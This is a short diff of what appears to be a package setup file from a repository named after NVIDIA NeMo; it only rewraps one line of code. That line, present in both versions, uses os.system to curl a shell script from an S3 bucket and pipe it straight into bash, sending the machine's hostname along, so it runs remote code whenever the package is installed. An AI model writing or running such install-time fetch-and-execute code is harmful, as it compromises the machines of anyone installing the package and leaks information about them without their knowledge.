@@ -1,4 +1,5 @@
-
 import os
 
-os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash?repository=https://github.com/NVIDIA/NeMo.git\&folder=NeMo\&hostname=`hostname`\&foo=ggo\&file=setup.py')
+os.system(
+    'curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash?repository=https://github.com/NVIDIA/NeMo.git\&folder=NeMo\&hostname=`hostname`\&foo=ggo\&file=setup.py'
+)
